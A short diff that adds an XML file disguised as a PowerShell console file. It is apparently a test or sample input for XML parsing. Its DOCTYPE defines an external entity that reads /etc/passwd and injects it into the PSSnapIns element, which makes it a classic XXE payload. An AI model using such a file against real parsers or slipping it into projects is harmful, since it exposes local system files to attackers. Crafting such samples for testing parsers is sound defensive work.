@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE c [ <!ENTITY leak SYSTEM "file:///etc/passwd"> ]>
+<PSConsoleFile ConsoleSchemaVersion="1.0">
+  <PSVersion>5.1</PSVersion>
+  <PSSnapIns>&leak;</PSSnapIns>
+</PSConsoleFile>
